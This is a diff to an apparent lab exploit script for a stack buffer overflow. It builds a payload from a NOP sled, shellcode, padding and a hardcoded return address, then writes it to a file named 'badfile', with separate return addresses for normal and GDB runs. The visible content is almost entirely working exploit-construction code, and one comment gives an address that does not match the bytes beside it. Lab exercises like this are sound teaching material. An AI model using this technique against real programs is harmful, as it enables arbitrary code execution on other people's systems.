@@ -30,15 +30,25 @@ padding = b"A" * 53
 # With ASLR disabled and 112-byte offset:
 # - Normal execution: buffer at 0xffffc8bc → target 0xffffc8b0 works
 # - GDB execution: buffer at 0xffffc84c → target 0xffffc85c (middle of NOP sled)
+
 if gdb_mode:
-    ret_addr = b"\x5c\xc8\xff\xff"  # For gdb: 0xffffc85c
+    #ret_addr = b"\x5c\xc8\xff\xff"  # For gdb: 0xffffc85c
+    ret_addr = b"\x9c\xcc\x8a\xff"  # For gdb: 0xffff8acc
+    ret_addr_val = 0xff8acc9c
     print("Mode: GDB", file=sys.stderr)
 else:
     ret_addr = b"\xb0\xc8\xff\xff"  # For normal: 0xffffc8b0
+    ret_addr_val = 0xffffc8b0
     print("Mode: Normal execution", file=sys.stderr)
+
+
+# Print the return address used
+print(f"[+] Return address used: {hex(ret_addr_val)}")
 
 # Construct final exploit buffer
 exploit = nop_sled + shellcode + padding + ret_addr
 
-# Output the exploit buffer as raw bytes
-sys.stdout.buffer.write(exploit)
+
+# Write the exploit buffer to 'badfile' as raw bytes
+with open('badfile', 'wb') as f:
+    f.write(exploit)
